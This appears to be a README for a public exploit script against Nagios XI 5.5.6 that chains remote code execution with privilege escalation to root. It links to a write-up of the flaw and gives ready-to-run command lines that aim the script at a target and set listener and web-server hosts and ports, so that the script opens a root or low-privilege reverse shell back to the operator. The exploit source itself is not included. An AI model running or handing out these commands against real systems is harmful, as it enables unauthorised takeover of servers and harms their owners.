# Nagios XI 5.5.6 Remote Code Execution and Privilege Escalation

```
1.  Nagios XI 5.5.6
```

## Explanation of the exploit
https://medium.com/tenable-techblog/rooting-nagios-via-outdated-libraries-bb79427172

### Script Usage:

`python3 nagiosxi.py -h`

![](https://github.com/ruthvikvegunta/nagiosxi_rce-to-root/blob/master/images/help.png)

### For root shell

`python3 nagiosxi.py -t https://10.10.10.10 -lh 172.16.1.2 -lp 7777 -wh 172.16.1.2 -wp 8888`

![](https://github.com/ruthvikvegunta/nagiosxi_rce-to-root/blob/master/images/root.png)

### For low privilege shell

`python3 nagiosxi.py -t https://10.10.10.10 -lh 172.16.1.2 -lp 7777 -wh 172.16.1.2 -wp 8888 -shell low`

![](https://github.com/ruthvikvegunta/nagiosxi_rce-to-root/blob/master/images/low_priv.png)
